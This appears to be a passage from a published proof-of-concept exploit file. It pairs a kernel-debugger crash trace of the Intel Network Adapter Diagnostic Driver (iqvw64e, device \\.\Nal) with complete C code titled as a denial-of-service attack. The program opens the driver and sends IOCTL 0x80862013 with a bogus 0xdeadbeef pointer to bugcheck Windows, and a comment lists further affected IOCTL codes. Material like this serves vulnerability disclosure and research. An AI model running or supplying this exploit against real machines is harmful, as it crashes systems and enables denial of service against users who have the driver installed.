+PROCESS fffffa8048f5f740
+    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
+    DirBase: 00187000  ObjectTable: fffff8a0000017f0  HandleCount: 535.
+    Image: System
+.
+.
+.
+
+PROCESS fffffa804d0f29e0
+    SessionId: 1  Cid: 0d9c    Peb: 7efdf000  ParentCid: 0afc
+    DirBase: 1aac4b000  ObjectTable: fffff8a016893450  HandleCount:  13.
+    Image: ConsoleApplication7.exe
+.
+.
+.
+
+3: kd> !handle fffffa804d0f29e0 7
+
+PROCESS fffffa804d0f29e0
+    SessionId: 1  Cid: 0d9c    Peb: 7efdf000  ParentCid: 0afc
+    DirBase: 1aac4b000  ObjectTable: fffff8a016893450  HandleCount:  13.
+    Image: ConsoleApplication7.exe
+
+Handle table at fffff8a016893450 with 13 entries in use
+
+Invalid Handle: 0x4d0f29e0
+
+3: kd> !process fffffa804d0f29e0 f
+PROCESS fffffa804d0f29e0
+    SessionId: 1  Cid: 0d9c    Peb: 7efdf000  ParentCid: 0afc
+    DirBase: 1aac4b000  ObjectTable: fffff8a016893450  HandleCount:  13.
+    Image: ConsoleApplication7.exe
+    VadRoot fffffa804a9eb220 Vads 30 Clone 0 Private 110. Modified 0. Locked 0.
+    DeviceMap fffff8a0022b5570
+    Token                             fffff8a01685d060
+    ElapsedTime                       00:00:39.608
+    UserTime                          00:00:00.000
+    KernelTime                        00:00:00.000
+    QuotaPoolUsage[PagedPool]         20128
+    QuotaPoolUsage[NonPagedPool]      3360
+    Working Set Sizes (now,min,max)  (510, 50, 345) (2040KB, 200KB, 1380KB)
+    PeakWorkingSetSize                510
+    VirtualSize                       11 Mb
+    PeakVirtualSize                   11 Mb
+    PageFaultCount                    529
+    MemoryPriority                    BACKGROUND
+    BasePriority                      8
+    CommitCharge                      140
+    Job                               fffffa804d0fc080
+
+        THREAD fffffa804c800060  Cid 0d9c.0da0  Teb: 000000007efdb000 Win32Thread: 0000000000000000 RUNNING on processor 3
+        IRP List:
+            fffffa804d01e160: (0006,0118) Flags: 00060000  Mdl: 00000000
+        Not impersonating
+        DeviceMap                 fffff8a0022b5570
+        Owning Process            fffffa804d0f29e0       Image:         ConsoleApplication7.exe
+        Attached Process          N/A            Image:         N/A
+        Wait Start TickCount      440956         Ticks: 0
+        Context Switch Count      31             IdealProcessor: 3             
+        UserTime                  00:00:00.000
+        KernelTime                00:00:00.000
+*** WARNING: Unable to verify checksum for ConsoleApplication7.exe
+*** ERROR: Module load completed but symbols could not be loaded for ConsoleApplication7.exe
+        Win32 Start Address ConsoleApplication7 (0x0000000000041354)
+        Stack Init fffff8800653bc70 Current fffff8800653b530
+        Base fffff8800653c000 Limit fffff88006536000 Call 0
+        Priority 11 BasePriority 8 UnusualBoost 0 ForegroundBoost 2 IoPriority 2 PagePriority 5
+        Child-SP          RetAddr           Call Site
+        fffff880`06539988 fffff800`037bba62 nt!RtlpBreakWithStatusInstruction
+        fffff880`06539990 fffff800`037bc84e nt!KiBugCheckDebugBreak+0x12
+        fffff880`065399f0 fffff800`036cbf84 nt!KeBugCheck2+0x71e
+        fffff880`0653a0c0 fffff800`036cb429 nt!KeBugCheckEx+0x104
+        fffff880`0653a100 fffff800`036cad7c nt!KiBugCheckDispatch+0x69
+        fffff880`0653a240 fffff800`036f6a4d nt!KiSystemServiceHandler+0x7c
+        fffff880`0653a280 fffff800`036f5825 nt!RtlpExecuteHandlerForException+0xd
+        fffff880`0653a2b0 fffff800`037067b1 nt!RtlDispatchException+0x415
+        fffff880`0653a990 fffff800`036cb502 nt!KiDispatchException+0x135
+        fffff880`0653b030 fffff800`036ca07a nt!KiExceptionDispatch+0xc2
+        fffff880`0653b210 fffff880`05a0bfd2 nt!KiPageFault+0x23a (TrapFrame @ fffff880`0653b210)
+        fffff880`0653b3a0 fffff880`05a091ac iqvw64e+0x3fd2
+        fffff880`0653b8a0 fffff800`039e80f7 iqvw64e+0x11ac
+        fffff880`0653b8d0 fffff800`039e8956 nt!IopXxxControlFile+0x607
+        fffff880`0653ba00 fffff800`036cb113 nt!NtDeviceIoControlFile+0x56
+        fffff880`0653ba70 00000000`73b02e09 nt!KiSystemServiceCopyEnd+0x13 (TrapFrame @ fffff880`0653bae0)
+        00000000`0021e898 00000000`73b02944 wow64cpu!CpupSyscallStub+0x9
+        00000000`0021e8a0 00000000`73b7d286 wow64cpu!DeviceIoctlFileFault+0x31
+        00000000`0021e960 00000000`73b7c69e wow64!RunCpuSimulation+0xa
+        00000000`0021e9b0 00000000`773f4966 wow64!Wow64LdrpInitialize+0x42a
+        00000000`0021ef00 00000000`773f1937 ntdll!LdrpInitializeProcess+0x17e3
+        00000000`0021f3f0 00000000`773dc34e ntdll! ?? ::FNODOBFM::`string'+0x28ff0
+        00000000`0021f460 00000000`00000000 ntdll!LdrInitializeThunk+0xe
+
+
+3: kd> !irp fffffa804d01e160
+Irp is active with 1 stacks 1 is current (= 0xfffffa804d01e230)
+ No Mdl: No System Buffer: Thread fffffa804c800060:  Irp stack trace.  
+     cmd  flg cl Device   File     Completion-Context
+>[  e, 0]   5  0 fffffa804aac7b00 fffffa804d1084d0 00000000-00000000    
+	       \FileSystem\iqvw64e
+			Args: 00000000 00000000 80862013 deadbeef
+
+3: kd> !object fffffa804aac7b00
+Object: fffffa804aac7b00  Type: (fffffa804900af30) Device
+    ObjectHeader: fffffa804aac7ad0 (new version)
+    HandleCount: 0  PointerCount: 2
+    Directory Object: fffff8a000010060  Name: Nal
+
+3: kd> dt_IO_STACK_LOCATION 0xfffffa804d01e230
+ntdll!_IO_STACK_LOCATION
+   +0x000 MajorFunction    : 0xe ''
+   +0x001 MinorFunction    : 0 ''
+   +0x002 Flags            : 0x5 ''
+   +0x003 Control          : 0 ''
+   +0x008 Parameters       : <unnamed-tag>
+   +0x028 DeviceObject     : 0xfffffa80`4aac7b00 _DEVICE_OBJECT
+   +0x030 FileObject       : 0xfffffa80`4d1084d0 _FILE_OBJECT
+   +0x038 CompletionRoutine : (null) 
+   +0x040 Context          : (null) 
+
+3: kd> !devobj 0xfffffa80`4aac7b00 7
+Device object (fffffa804aac7b00) is for:
+ Nal \FileSystem\iqvw64e DriverObject fffffa804b0f4d70
+Current Irp 00000000 RefCount 1 Type 00008086 Flags 00000044
+Dacl fffff9a10008c391 DevExt fffffa804aac7c50 DevObjExt fffffa804aac7c68 
+ExtensionFlags (0x00000800)  DOE_DEFAULT_SD_PRESENT
+Characteristics (0000000000)  
+Device queue is not busy.
+
+3: kd> !drvobj fffffa804b0f4d70 7
+Driver object (fffffa804b0f4d70) is for:
+ \FileSystem\iqvw64e
+Driver Extension List: (id , addr)
+
+Device Object list:
+fffffa804aac7b00  
+
+DriverEntry:   fffff88005fda200	iqvw64e
+DriverStartIo: 00000000	
+DriverUnload:  fffff88005a09010	iqvw64e
+AddDevice:     00000000	
+
+Dispatch routines:
+[00] IRP_MJ_CREATE                      fffff88005a09090	iqvw64e+0x1090
+[01] IRP_MJ_CREATE_NAMED_PIPE           fffff800036b0e30	nt!IopInvalidDeviceRequest
+[02] IRP_MJ_CLOSE                       fffff88005a090f0	iqvw64e+0x10f0
+[03] IRP_MJ_READ                        fffff800036b0e30	nt!IopInvalidDeviceRequest
+[04] IRP_MJ_WRITE                       fffff800036b0e30	nt!IopInvalidDeviceRequest
+[05] IRP_MJ_QUERY_INFORMATION           fffff800036b0e30	nt!IopInvalidDeviceRequest
+[06] IRP_MJ_SET_INFORMATION             fffff800036b0e30	nt!IopInvalidDeviceRequest
+[07] IRP_MJ_QUERY_EA                    fffff800036b0e30	nt!IopInvalidDeviceRequest
+[08] IRP_MJ_SET_EA                      fffff800036b0e30	nt!IopInvalidDeviceRequest
+[09] IRP_MJ_FLUSH_BUFFERS               fffff800036b0e30	nt!IopInvalidDeviceRequest
+[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    fffff800036b0e30	nt!IopInvalidDeviceRequest
+[0b] IRP_MJ_SET_VOLUME_INFORMATION      fffff800036b0e30	nt!IopInvalidDeviceRequest
+[0c] IRP_MJ_DIRECTORY_CONTROL           fffff800036b0e30	nt!IopInvalidDeviceRequest
+[0d] IRP_MJ_FILE_SYSTEM_CONTROL         fffff800036b0e30	nt!IopInvalidDeviceRequest
+[0e] IRP_MJ_DEVICE_CONTROL              fffff88005a09150	iqvw64e+0x1150
+[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     fffff800036b0e30	nt!IopInvalidDeviceRequest
+[10] IRP_MJ_SHUTDOWN                    fffff800036b0e30	nt!IopInvalidDeviceRequest
+[11] IRP_MJ_LOCK_CONTROL                fffff800036b0e30	nt!IopInvalidDeviceRequest
+[12] IRP_MJ_CLEANUP                     fffff800036b0e30	nt!IopInvalidDeviceRequest
+[13] IRP_MJ_CREATE_MAILSLOT             fffff800036b0e30	nt!IopInvalidDeviceRequest
+[14] IRP_MJ_QUERY_SECURITY              fffff800036b0e30	nt!IopInvalidDeviceRequest
+[15] IRP_MJ_SET_SECURITY                fffff800036b0e30	nt!IopInvalidDeviceRequest
+[16] IRP_MJ_POWER                       fffff800036b0e30	nt!IopInvalidDeviceRequest
+[17] IRP_MJ_SYSTEM_CONTROL              fffff800036b0e30	nt!IopInvalidDeviceRequest
+[18] IRP_MJ_DEVICE_CHANGE               fffff800036b0e30	nt!IopInvalidDeviceRequest
+[19] IRP_MJ_QUERY_QUOTA                 fffff800036b0e30	nt!IopInvalidDeviceRequest
+[1a] IRP_MJ_SET_QUOTA                   fffff800036b0e30	nt!IopInvalidDeviceRequest
+[1b] IRP_MJ_PNP                         fffff800036b0e30	nt!IopInvalidDeviceRequest
+
+
+*/
+
+#include <windows.h>
+#include <stdio.h>
+#include <conio.h>
+
+int main(int argc, char **argv)
+{
+	HANDLE   hDevice;
+	DWORD    bret;
+	char     szDevice[] = "\\\\.\\Nal";
+
+	printf("--[ Intel Network Adapter Diagnostic Driver DoS ]--\n");
+
+	printf("Opening handle to driver..\n");
+	// CreateFile(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDispoition, dwFlagsAndAttributes, hTemplateFile)
+	if ((hDevice = CreateFileA(szDevice, GENERIC_READ | GENERIC_WRITE,0,0,OPEN_EXISTING,0,NULL)) != INVALID_HANDLE_VALUE)	{
+		printf("Device %s succesfully opened!\n", szDevice);
+		printf("\tHandle: %p\n", hDevice);
+	}
+	else
+	{
+		printf("Error: Error opening device %s\n", szDevice);
+	}
+
+	printf("\nPress any key to DoS..");
+	_getch();
+
+	bret = 0;
+	// Affected IOCTL codes: 0x80862013, 0x8086200B, 0x8086200F, 0x80862007
+	// DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped)
+	if (!DeviceIoControl(hDevice, 0x80862013, (LPVOID)0xdeadbeef, 0x0, (LPVOID)0xdeadbeef, 0x0, &bret, NULL))
+	{
+		printf("DeviceIoControl Error - bytes returned %#x\n", bret);
+	}
+
+	CloseHandle(hDevice);
+	return 0;
+}
